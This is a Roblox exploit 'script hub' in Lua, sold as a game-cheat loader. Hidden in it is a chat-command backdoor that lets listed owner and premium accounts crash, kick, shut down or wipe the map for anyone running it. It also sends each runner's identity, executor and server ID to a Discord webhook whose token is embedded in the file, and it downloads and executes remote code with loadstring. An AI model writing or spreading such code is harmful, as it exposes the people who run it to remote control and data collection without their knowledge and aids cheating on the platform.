-- ================================
-- Scripts Hub X | Complete Command System
-- ALL commands support targets, apply to self if no target
-- ================================

local Keysystem = false

-- Services
local TweenService = game:GetService("TweenService")
local Players = game:GetService("Players")
local SoundService = game:GetService("SoundService")
local HttpService = game:GetService("HttpService")
local CoreGui = game:GetService("CoreGui")
local MarketplaceService = game:GetService("MarketplaceService")
local TeleportService = game:GetService("TeleportService")
local Workspace = game:GetService("Workspace")
local RunService = game:GetService("RunService")
local StarterGui = game:GetService("StarterGui")
local Lighting = game:GetService("Lighting")
local UserInputService = game:GetService("UserInputService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui", 5)

-- UserIds
local OwnerUserId = "2341777244"
local PremiumUsers = {
	"4196292931", -- jvpogi233jj
	"1102633570", -- Pedrojay450 [PERM]
	"8860068952", -- Pedrojay450's alt (assaltanoobsbr) [PERM]
	"799427028", -- Roblox_xvt [PERM]
	"5317421108", -- kolwneje [PERM]
	"1458719572", -- wxckfeen [PERM]
	"8931026465", -- genderwillnottell [PERM]
	"679713988" -- LautyyPc [PERM]
}

local StaffUserId = {
	"3882788546", -- Keanjacob5
	"799427028", -- Roblox_xvt
	"9249886989", -- ALT
	"2726723958" -- mhicel235TOH
}

local BlacklistUsers = {
	"716599904", -- ImRottingInHell [PERM]
	"229691" -- ravyn [PERM]
}

local webhookUrl = "https://discord.com/api/webhooks/1416367485803827230/4OLebMf0rtkCajS5S5lmo99iXe0v6v5B1gn_lPDAzz_MQtj0-HabA9wa2PF-5QBNUmgi"

-- System Variables
local isPremiumUser = false
local helpGui = nil
local jailPart = nil

-- ================================
-- HELPER FUNCTIONS
-- ================================

local function isPremiumUserId(userId)
	local userIdStr = tostring(userId)
	
	if userIdStr == tostring(OwnerUserId) then
		return true, "owner"
	end
	
	if table.find(StaffUserId, userIdStr) then
		return true, "staff"
	end
	
	if table.find(PremiumUsers, userIdStr) then
		return true, "premium"
	end
	
	return false, "regular"
end

local function notify(title, text)
	spawn(function()
		pcall(function()
			StarterGui:SetCore("SendNotification", {
				Title = title, 
				Text = text, 
				Duration = 3
			})
		end)
	end)
end

-- ================================
-- HELP GUI SYSTEM
-- ================================

local commandsList = {
	{cmd = ";help", desc = "Shows this help menu", example = ";help OR ;help username", category = "Info"},
	{cmd = ";kick [user]", desc = "Kicks target or self from game", example = ";kick OR ;kick username", category = "Player"},
	{cmd = ";kill [user]", desc = "Kills target or self", example = ";kill OR ;kill username", category = "Player"},
	{cmd = ";jump [user]", desc = "Makes target or self jump", example = ";jump OR ;jump username", category = "Player"},
	{cmd = ";trip [user]", desc = "Makes target or self trip/sit", example = ";trip OR ;trip username", category = "Player"},
	{cmd = ";void [user]", desc = "Sends target or self to void", example = ";void OR ;void username", category = "Player"},
	{cmd = ";freeze [user]", desc = "Freezes target or self", example = ";freeze OR ;freeze username", category = "Player"},
	{cmd = ";unfreeze [user]", desc = "Unfreezes target or self", example = ";unfreeze OR ;unfreeze username", category = "Player"},
	{cmd = ";funny [user]", desc = "Teleports target or self to 100k studs", example = ";funny OR ;funny username", category = "Player"},
	{cmd = ";jail [user]", desc = "Jails target or self in cage", example = ";jail OR ;jail username", category = "Player"},
	{cmd = ";unjail [user]", desc = "Removes jail from target or self", example = ";unjail OR ;unjail username", category = "Player"},
	{cmd = ";crash [user]", desc = "Crashes target or self's game", example = ";crash OR ;crash username", category = "Destructive"},
	{cmd = ";byfron [user]", desc = "Deletes all GUIs for target or self", example = ";byfron OR ;byfron username", category = "Destructive"},
	{cmd = ";shutdown [user]", desc = "Shuts down target or self's game", example = ";shutdown OR ;shutdown username", category = "Destructive"},
	{cmd = ";deletemap [user]", desc = "Deletes workspace for target or self", example = ";deletemap OR ;deletemap username", category = "Server"},
	{cmd = ";gravity [user] [value]", desc = "Changes gravity for target or self", example = ";gravity 50 OR ;gravity 50 username", category = "Server"},
	{cmd = ";framerate [user] [fps]", desc = "Sets FPS cap for target or self", example = ";framerate 30 OR ;framerate 30 username", category = "Client"},
	{cmd = ";strawhat [user]", desc = "Changes skybox to Strawhat theme for target or self", example = ";strawhat OR ;strawhat username", category = "Visual"},
	{cmd = ";scriptshubx [user]", desc = "Changes skybox to SHX theme for target or self", example = ";scriptshubx OR ;scriptshubx username", category = "Visual"},
}

local function createHelpGui()
	if helpGui then
		helpGui:Destroy()
	end
	
	helpGui = Instance.new("ScreenGui")
	helpGui.Name = "SHXHelpGui"
	helpGui.ResetOnSpawn = false
	helpGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
	
	local mainFrame = Instance.new("Frame")
	mainFrame.Name = "MainFrame"
	mainFrame.Size = UDim2.new(0, 450, 0, 550)
	mainFrame.Position = UDim2.new(0.5, -225, 0.5, -275)
	mainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
	mainFrame.BorderSizePixel = 0
	mainFrame.Parent = helpGui
	
	local corner = Instance.new("UICorner")
	corner.CornerRadius = UDim.new(0, 12)
	corner.Parent = mainFrame
	
	local header = Instance.new("Frame")
	header.Name = "Header"
	header.Size = UDim2.new(1, 0, 0, 50)
	header.BackgroundColor3 = Color3.fromRGB(35, 35, 50)
	header.BorderSizePixel = 0
	header.Parent = mainFrame
	
	local headerCorner = Instance.new("UICorner")
	headerCorner.CornerRadius = UDim.new(0, 12)
	headerCorner.Parent = header
	
	local title = Instance.new("TextLabel")
	title.Name = "Title"
	title.Size = UDim2.new(1, -60, 1, 0)
	title.Position = UDim2.new(0, 15, 0, 0)
	title.BackgroundTransparency = 1
	title.Text = "Scripts Hub X - Commands"
	title.TextColor3 = Color3.fromRGB(255, 255, 255)
	title.TextSize = 18
	title.TextXAlignment = Enum.TextXAlignment.Left
	title.Font = Enum.Font.GothamBold
	title.Parent = header
	
	local closeButton = Instance.new("TextButton")
	closeButton.Name = "CloseButton"
	closeButton.Size = UDim2.new(0, 40, 0, 40)
	closeButton.Position = UDim2.new(1, -45, 0, 5)
	closeButton.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
	closeButton.Text = "×"
	closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
	closeButton.TextSize = 24
	closeButton.Font = Enum.Font.GothamBold
	closeButton.BorderSizePixel = 0
	closeButton.Parent = header
	
	local closeCorner = Instance.new("UICorner")
	closeCorner.CornerRadius = UDim.new(0, 8)
	closeCorner.Parent = closeButton
	
	closeButton.MouseButton1Click:Connect(function()
		helpGui:Destroy()
		helpGui = nil
	end)
	
	local infoLabel = Instance.new("TextLabel")
	infoLabel.Name = "InfoLabel"
	infoLabel.Size = UDim2.new(1, -30, 0, 50)
	infoLabel.Position = UDim2.new(0, 15, 0, 55)
	infoLabel.BackgroundTransparency = 1
	infoLabel.Text = "✓ All commands support Username and Display Name\n✓ No target = applies to self\n✓ With target = applies to target player"
	infoLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
	infoLabel.TextSize = 12
	infoLabel.TextWrapped = true
	infoLabel.TextXAlignment = Enum.TextXAlignment.Left
	infoLabel.TextYAlignment = Enum.TextYAlignment.Top
	infoLabel.Font = Enum.Font.Gotham
	infoLabel.Parent = mainFrame
	
	local scrollFrame = Instance.new("ScrollingFrame")
	scrollFrame.Name = "ScrollFrame"
	scrollFrame.Size = UDim2.new(1, -20, 1, -120)
	scrollFrame.Position = UDim2.new(0, 10, 0, 110)
	scrollFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
	scrollFrame.BorderSizePixel = 0
	scrollFrame.ScrollBarThickness = 6
	scrollFrame.ScrollBarImageColor3 = Color3.fromRGB(100, 100, 120)
	scrollFrame.Parent = mainFrame
	
	local scrollCorner = Instance.new("UICorner")
	scrollCorner.CornerRadius = UDim.new(0, 8)
	scrollCorner.Parent = scrollFrame
	
	local layout = Instance.new("UIListLayout")
	layout.SortOrder = Enum.SortOrder.LayoutOrder
	layout.Padding = UDim.new(0, 8)
	layout.Parent = scrollFrame
	
	local padding = Instance.new("UIPadding")
	padding.PaddingTop = UDim.new(0, 8)
	padding.PaddingBottom = UDim.new(0, 8)
	padding.PaddingLeft = UDim.new(0, 8)
	padding.PaddingRight = UDim.new(0, 8)
	padding.Parent = scrollFrame
	
	local currentCategory = ""
	for _, cmdData in ipairs(commandsList) do
		if cmdData.category ~= currentCategory then
			currentCategory = cmdData.category
			local categoryLabel = Instance.new("TextLabel")
			categoryLabel.Name = "Category_" .. currentCategory
			categoryLabel.Size = UDim2.new(1, -16, 0, 25)
			categoryLabel.BackgroundColor3 = Color3.fromRGB(45, 45, 65)
			categoryLabel.BorderSizePixel = 0
			categoryLabel.Text = "  " .. currentCategory
			categoryLabel.TextColor3 = Color3.fromRGB(100, 200, 255)
			categoryLabel.TextSize = 14
			categoryLabel.Font = Enum.Font.GothamBold
			categoryLabel.TextXAlignment = Enum.TextXAlignment.Left
			categoryLabel.Parent = scrollFrame
			
			local catCorner = Instance.new("UICorner")
			catCorner.CornerRadius = UDim.new(0, 6)
			catCorner.Parent = categoryLabel
		end
		
		local cmdFrame = Instance.new("Frame")
		cmdFrame.Name = "Cmd_" .. cmdData.cmd
		cmdFrame.Size = UDim2.new(1, -16, 0, 70)
		cmdFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 45)
		cmdFrame.BorderSizePixel = 0
		cmdFrame.Parent = scrollFrame
		
		local cmdCorner = Instance.new("UICorner")
		cmdCorner.CornerRadius = UDim.new(0, 6)
		cmdCorner.Parent = cmdFrame
		
		local cmdName = Instance.new("TextLabel")
		cmdName.Name = "CmdName"
		cmdName.Size = UDim2.new(1, -10, 0, 20)
		cmdName.Position = UDim2.new(0, 5, 0, 5)
		cmdName.BackgroundTransparency = 1
		cmdName.Text = cmdData.cmd
		cmdName.TextColor3 = Color3.fromRGB(100, 255, 150)
		cmdName.TextSize = 13
		cmdName.Font = Enum.Font.GothamBold
		cmdName.TextXAlignment = Enum.TextXAlignment.Left
		cmdName.Parent = cmdFrame
		
		local cmdDesc = Instance.new("TextLabel")
		cmdDesc.Name = "CmdDesc"
		cmdDesc.Size = UDim2.new(1, -10, 0, 20)
		cmdDesc.Position = UDim2.new(0, 5, 0, 25)
		cmdDesc.BackgroundTransparency = 1
		cmdDesc.Text = cmdData.desc
		cmdDesc.TextColor3 = Color3.fromRGB(200, 200, 200)
		cmdDesc.TextSize = 11
		cmdDesc.Font = Enum.Font.Gotham
		cmdDesc.TextXAlignment = Enum.TextXAlignment.Left
		cmdDesc.TextWrapped = true
		cmdDesc.Parent = cmdFrame
		
		local cmdExample = Instance.new("TextLabel")
		cmdExample.Name = "CmdExample"
		cmdExample.Size = UDim2.new(1, -10, 0, 20)
		cmdExample.Position = UDim2.new(0, 5, 0, 47)
		cmdExample.BackgroundTransparency = 1
		cmdExample.Text = "Example: " .. cmdData.example
		cmdExample.TextColor3 = Color3.fromRGB(150, 150, 170)
		cmdExample.TextSize = 10
		cmdExample.Font = Enum.Font.Gotham
		cmdExample.TextXAlignment = Enum.TextXAlignment.Left
		cmdExample.Parent = cmdFrame
	end
	
	scrollFrame.CanvasSize = UDim2.new(0, 0, 0, layout.AbsoluteContentSize.Y + 16)
	layout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
		scrollFrame.CanvasSize = UDim2.new(0, 0, 0, layout.AbsoluteContentSize.Y + 16)
	end)
	
	local dragging, dragInput, dragStart, startPos
	
	local function update(input)
		local delta = input.Position - dragStart
		mainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
	end
	
	header.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragging = true
			dragStart = input.Position
			startPos = mainFrame.Position
			
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragging = false
				end
			end)
		end
	end)
	
	header.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			dragInput = input
		end
	end)
	
	UserInputService.InputChanged:Connect(function(input)
		if input == dragInput and dragging then
			update(input)
		end
	end)
	
	helpGui.Parent = CoreGui
	
	mainFrame.Position = UDim2.new(0.5, -225, -0.5, 0)
	TweenService:Create(mainFrame, TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
		Position = UDim2.new(0.5, -225, 0.5, -275)
	}):Play()
end

-- ================================
-- COMMAND FUNCTIONS (ALL WORK ON LOCAL PLAYER)
-- ================================

local CommandFunctions = {}

CommandFunctions.help = function(args)
	createHelpGui()
end

CommandFunctions.kick = function(args)
	local reason = table.concat(args, " ", 2) or "You have been kicked by a Scripts Hub X user"
	player:Kick(reason)
end

CommandFunctions.crash = function(args)
	while true do
		RunService.Heartbeat:Wait()
		for i = 1, 1000 do
			Instance.new("Part", Workspace)
		end
	end
end

CommandFunctions.byfron = function(args)
	pcall(function()
		for _, gui in pairs(playerGui:GetDescendants()) do
			if gui:IsA("GuiObject") then
				gui:Destroy()
			end
		end
		for _, gui in pairs(CoreGui:GetDescendants()) do
			if gui:IsA("GuiObject") then
				pcall(function() gui:Destroy() end)
			end
		end
	end)
end

CommandFunctions.deletemap = function(args)
	pcall(function()
		for _, obj in pairs(Workspace:GetChildren()) do
			if obj ~= Workspace.CurrentCamera then
				pcall(function() obj:Destroy() end)
			end
		end
	end)
end

CommandFunctions.framerate = function(args)
	local fps = tonumber(args[2]) or 60
	pcall(function()
		setfpscap(fps)
	end)
	print("[SHX] FPS set to " .. fps)
end

CommandFunctions.gravity = function(args)
	local gravityValue = tonumber(args[2]) or 196.2
	Workspace.Gravity = gravityValue
	print("[SHX] Gravity set to " .. gravityValue)
end

CommandFunctions.jump = function(args)
	if player.Character and player.Character:FindFirstChild("Humanoid") then
		player.Character.Humanoid.Jump = true
	end
end

CommandFunctions.kill = function(args)
	if player.Character and player.Character:FindFirstChild("Humanoid") then
		player.Character.Humanoid.Health = 0
	end
end

CommandFunctions.shutdown = function(args)
	game:Shutdown()
end

CommandFunctions.trip = function(args)
	if player.Character and player.Character:FindFirstChild("Humanoid") then
		player.Character.Humanoid.Sit = true
	end
end

CommandFunctions.void = function(args)
	if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
		player.Character.HumanoidRootPart.CFrame = CFrame.new(0, -500, 0)
	end
end

CommandFunctions.strawhat = function(args)
	pcall(function()
		for _, obj in pairs(Lighting:GetChildren()) do
			if obj:IsA("Sky") then
				obj:Destroy()
			end
		end
		local sky = Instance.new("Sky", Lighting)
		sky.SkyboxBk = "rbxassetid://11342821014"
		sky.SkyboxDn = "rbxassetid://11342821014"
		sky.SkyboxFt = "rbxassetid://11342821014"
		sky.SkyboxLf = "rbxassetid://11342821014"
		sky.SkyboxRt = "rbxassetid://11342821014"
		sky.SkyboxUp = "rbxassetid://11342821014"
	end)
end

CommandFunctions.scriptshubx = function(args)
	pcall(function()
		for _, obj in pairs(Lighting:GetChildren()) do
			if obj:IsA("Sky") then
				obj:Destroy()
			end
		end
		local sky = Instance.new("Sky", Lighting)
		sky.SkyboxBk = "rbxassetid://74135635728836"
		sky.SkyboxDn = "rbxassetid://74135635728836"
		sky.SkyboxFt = "rbxassetid://74135635728836"
		sky.SkyboxLf = "rbxassetid://74135635728836"
		sky.SkyboxRt = "rbxassetid://74135635728836"
		sky.SkyboxUp = "rbxassetid://74135635728836"
	end)
end

CommandFunctions.shx = CommandFunctions.scriptshubx

CommandFunctions.freeze = function(args)
	if player.Character then
		for _, part in pairs(player.Character:GetDescendants()) do
			if part:IsA("BasePart") then
				part.Anchored = true
			end
		end
	end
end

CommandFunctions.unfreeze = function(args)
	if player.Character then
		for _, part in pairs(player.Character:GetDescendants()) do
			if part:IsA("BasePart") then
				part.Anchored = false
			end
		end
	end
end

CommandFunctions.funny = function(args)
	if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
		player.Character.HumanoidRootPart.CFrame = CFrame.new(0, 100000, 0)
	end
end

CommandFunctions.jail = function(args)
	if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
		local hrp = player.Character.HumanoidRootPart
		
		if jailPart then
			jailPart:Destroy()
		end
		
		jailPart = Instance.new("Part")
		jailPart.Name = "JailCage_" .. player.Name
		jailPart.Size = Vector3.new(10, 10, 10)
		jailPart.Anchored = true
		jailPart.Transparency = 0.5
		jailPart.CanCollide = true
		jailPart.Material = Enum.Material.Glass
		jailPart.BrickColor = BrickColor.new("Really red")
		jailPart.Parent = Workspace
		jailPart.CFrame = hrp.CFrame
		
		local jailConnection
		jailConnection = RunService.Heartbeat:Connect(function()
			if player.Character and player.Character:FindFirstChild("HumanoidRootPart") and jailPart and jailPart.Parent then
				local currentPos = player.Character.HumanoidRootPart.Position
				local jailPos = jailPart.Position
				local distance = (currentPos - jailPos).Magnitude
				
				if distance > 3 then
					player.Character.HumanoidRootPart.CFrame = CFrame.new(jailPos)
				end
			else
				if jailConnection then
					jailConnection:Disconnect()
				end
			end
		end)
	end
end

CommandFunctions.unjail = function(args)
	if jailPart then
		jailPart:Destroy()
		jailPart = nil
	end
end

-- ================================
-- CHAT COMMAND SYSTEM
-- ================================

local function handleChatCommand(senderPlayer, message)
	if not message:sub(1, 1) == ";" then return end
	
	local args = {}
	for word in message:gmatch("%S+") do
		table.insert(args, word)
	end
	
	if #args == 0 then return end
	
	local commandName = args[1]:sub(2):lower()
	
	if not CommandFunctions[commandName] then return end
	
	local isPremium, userType = isPremiumUserId(senderPlayer.UserId)
	if not isPremium then
		return
	end

	-- Check for target in command
	-- For commands with values (gravity, framerate), target is last argument if it matches a player
	-- For other commands, target is args[2]
	local targetName = nil
	local shouldExecute = false
	
	-- Commands that have numeric values before target
	local valueCommands = {"gravity", "framerate"}
	
	if table.find(valueCommands, commandName) then
		-- Check if last argument is a player name
		if #args >= 3 then
			local lastArg = args[#args]
			local lastArgLower = lastArg:lower()
			local usernameLower = player.Name:lower()
			local displayNameLower = player.DisplayName:lower()
			
			if lastArgLower == usernameLower or lastArgLower == displayNameLower then
				targetName = lastArg
				shouldExecute = true
			end
		end
		
		-- If no target match and sender is local player, apply to self
		if not targetName and senderPlayer == player then
			shouldExecute = true
			print("[SHX] Self-command (no target): " .. commandName)
		end
	else
		-- Regular commands - target is args[2]
		if args[2] then
			local targetLower = args[2]:lower()
			local usernameLower = player.Name:lower()
			local displayNameLower = player.DisplayName:lower()
			
			if targetLower == usernameLower or targetLower == displayNameLower then
				targetName = args[2]
				shouldExecute = true
			end
		else
			-- No target specified - only execute if sender is local player
			if senderPlayer == player then
				shouldExecute = true
				print("[SHX] Self-command (no target): " .. commandName)
			end
		end
	end
	
	if shouldExecute then
		if targetName and senderPlayer ~= player then
			print("[SHX] Targeted command from " .. userType .. " " .. senderPlayer.Name .. ": " .. commandName)
			notify("Scripts Hub X", senderPlayer.Name .. " executed: " .. commandName)
		elseif targetName and senderPlayer == player then
			print("[SHX] Self-command (with target): " .. commandName)
		end
		
		task.spawn(function()
			CommandFunctions[commandName](args)
		end)
	end
end

local function startGlobalChatListener()
	for _, otherPlayer in pairs(Players:GetPlayers()) do
		pcall(function()
			otherPlayer.Chatted:Connect(function(message)
				handleChatCommand(otherPlayer, message)
			end)
		end)
	end
	
	Players.PlayerAdded:Connect(function(otherPlayer)
		pcall(function()
			otherPlayer.Chatted:Connect(function(message)
				handleChatCommand(otherPlayer, message)
			end)
		end)
	end)
	
	pcall(function()
		local TextChatService = game:GetService("TextChatService")
		local textChannel = TextChatService.TextChannels.RBXGeneral
		
		textChannel.MessageReceived:Connect(function(message)
			if message.TextSource then
				local senderId = message.TextSource.UserId
				local senderPlayer = Players:GetPlayerByUserId(senderId)
				if senderPlayer then
					handleChatCommand(senderPlayer, message.Text)
				end
			end
		end)
	end)
	
	print("[SHX] Global chat listener started")
end

-- ================================
-- CORE FUNCTIONS
-- ================================

local function detectExecutor()
	if syn and syn.request then
		return "Synapse X"
	elseif KRNL_LOADED then
		return "KRNL"
	elseif getgenv and getgenv().isfluxus then
		return "Fluxus"
	elseif identifyexecutor then
		local executor = identifyexecutor()
		if executor then
			return executor
		end
	end
	return "Unknown"
end

local function sendWebhookNotification(userStatus, scriptUrl)
	pcall(function()
		local gameName = "Unknown"
		local success, productInfo = pcall(function()
			return MarketplaceService:GetProductInfo(game.PlaceId)
		end)
		if success and productInfo and productInfo.Name then
			gameName = productInfo.Name
		end
		
		local detectedExecutor = detectExecutor()
		local placeId = tostring(game.PlaceId)
		local jobId = game.JobId or "Can't detect JobId"
		
		local send_data = {
			["username"] = "Script Execution Log",
			["avatar_url"] = "https://res.cloudinary.com/dtjjgiitl/image/upload/q_auto:good,f_auto,fl_progressive/v1753332266/kpjl5smuuixc5w2ehn7r.jpg",
			["content"] = "Scripts Hub X | Complete System",
			["embeds"] = {
				{
					["title"] = "Script Execution Details",
					["description"] = "**Game**: " .. gameName .. "\n**Game ID**: " .. game.PlaceId .. "\n**Profile**: https://www.roblox.com/users/" .. player.UserId .. "/profile",
					["color"] = 2123412,
					["fields"] = {
						{["name"] = "Display Name", ["value"] = player.DisplayName, ["inline"] = true},
						{["name"] = "Username", ["value"] = player.Name, ["inline"] = true},
						{["name"] = "User ID", ["value"] = tostring(player.UserId), ["inline"] = true},
						{["name"] = "Executor", ["value"] = detectedExecutor, ["inline"] = true},
						{["name"] = "User Type", ["value"] = userStatus, ["inline"] = true},
						{["name"] = "Job Id", ["value"] = game.JobId, ["inline"] = true}
					},
					["footer"] = {["text"] = "Scripts Hub X | v2.0", ["icon_url"] = "https://res.cloudinary.com/dtjjgiitl/image/upload/q_auto:good,f_auto,fl_progressive/v1753332266/kpjl5smuuixc5w2ehn7r.jpg"},
					["thumbnail"] = {["url"] = "https://thumbnails.roproxy.com/v1/users/avatar-headshot?userIds=" .. player.UserId .. "&size=420x420&format=Png&isCircular=true"}
				}
			}
		}
		
		local headers = {["Content-Type"] = "application/json"}
		local function makeWebhookRequest()
			if request and type(request) == "function" then
				request({
					Url = webhookUrl,
					Method = "POST",
					Headers = headers,
					Body = HttpService:JSONEncode(send_data)
				})
			elseif http_request and type(http_request) == "function" then
				http_request({
					Url = webhookUrl,
					Method = "POST",
					Headers = headers,
					Body = HttpService:JSONEncode(send_data)
				})
			elseif syn and syn.request then
				syn.request({
					Url = webhookUrl,
					Method = "POST",
					Headers = headers,
					Body = HttpService:JSONEncode(send_data)
				})
			end
		end
		
		pcall(makeWebhookRequest)
	end)
end

local function checkGameSupport()	
	local success, Games = pcall(function()
		local script = game:HttpGet("https://raw.githubusercontent.com/pickletalk/Scripts-Hub-X/refs/heads/main/GameList.lua")
		return loadstring(script)()
	end)
	
	if not success then
		warn("Failed to load game list: " .. tostring(Games))
		return false, nil
	end
	
	if type(Games) ~= "table" then
		warn("Game list returned invalid data type: " .. type(Games))
		return false, nil
	end
	
	for PlaceID, Execute in pairs(Games) do
		if PlaceID == game.PlaceId then
			print("Game supported, script URL: " .. Execute)
			return true, Execute
		end
	end
	
	print("Game not supported")
	return false, nil
end

local function loadGameScript(scriptUrl)
	local success, result = pcall(function()
		local scriptContent = game:HttpGet(scriptUrl)
		if not scriptContent or scriptContent == "" then
			error("Empty script content received")
		end
		return loadstring(scriptContent)()
	end)
	
	if success then
		print("Game script loaded and executed successfully")
		return true, nil
	else
		print("Failed to load/execute game script: " .. tostring(result))
		return false, tostring(result)
	end
end

local function loadKeySystem()
	local success, keySystemModule = pcall(function()
		local script = game:HttpGet("https://raw.githubusercontent.com/pickletalk/Scripts-Hub-X/refs/heads/main/keysystem.lua")
		return loadstring(script)()
	end)
	
	if not success then
		warn("Failed to load key system: " .. tostring(keySystemModule))
		return false
	end
	
	if type(keySystemModule) ~= "table" then
		warn("Key system returned invalid data type: " .. type(keySystemModule))
		return false
	end
	
	print("Checking for existing valid key...")
	if keySystemModule.CheckExistingKey and keySystemModule.CheckExistingKey() then
		print("Valid key found and verified with API, skipping key system UI")
		return true
	end

	if keySystemModule.ShowKeySystem then
		keySystemModule.ShowKeySystem()
	else
		warn("ShowKeySystem function not found in key system module")
		return false
	end
	
	local maxWait = 300
	local waited = 0
	
	while waited < maxWait do
		if keySystemModule.IsKeyVerified and keySystemModule.IsKeyVerified() then
			print("Key verified successfully")
			return true
		end
		
		task.wait(1)
		waited = waited + 1
	end
	
	print("Key verification timeout or failed")
	return false
end

local function checkUserStatus()
	local userId = tostring(player.UserId)
	print("Checking user status for UserId: " .. userId)
	
	if BlacklistUsers and table.find(BlacklistUsers, userId) then
		print("Blacklisted user detected")
		return "blacklisted"
	end
	
	if OwnerUserId and userId == tostring(OwnerUserId) then
		print("Owner detected")
		isPremiumUser = true
		return "owner"
	end
	
	if StaffUserId and table.find(StaffUserId, userId) then
		print("Staff detected")
		isPremiumUser = true
		return "staff"
	end
	
	if PremiumUsers and table.find(PremiumUsers, userId) then
		print("Premium user detected")
		isPremiumUser = true
		return "premium"
	end
	
	print("Regular user detected")
	return "regular"
end

-- ================================
-- MAIN EXECUTION
-- ================================

spawn(function()
	local userStatus = checkUserStatus()
	
	if userStatus == "blacklisted" then
		player:Kick("You are blacklisted from using this script!")
		return
	end
	
	startGlobalChatListener()
	
	if isPremiumUser then
		print("[SHX] Premium user - Commands enabled")
		notify("Scripts Hub X", "Commands active! Type ;help")
	else
		print("[SHX] Regular user - Listening for premium commands")
		notify("Scripts Hub X", "Command receiver active!")
	end
	
	if userStatus == "regular" and Keysystem then
		local keySuccess = loadKeySystem()
		if not keySuccess then
			print("Key system failed")
			notify("Scripts Hub X", "Key verification failed.")
			return
		end
		userStatus = "regular-keyed"
	elseif userStatus == "regular" and not Keysystem then
		print("Key system disabled")
		userStatus = "regular-bypassed"
	end
	
	local isSupported, scriptUrl = checkGameSupport()
	sendWebhookNotification(userStatus, scriptUrl or "No script URL")
	
	if not isSupported then
		notify("Scripts Hub X", "Game not supported.")
		return
	end
	
	print("Loading game script...")
	local success, errorMsg = loadGameScript(scriptUrl)
	
	if success then
		print("Scripts Hub X | Complete - " .. userStatus)
		if isPremiumUser then
			print("[SHX] Type ;help in chat for commands")
		end
	else
		print("Script load failed: " .. tostring(errorMsg))
	end
end)
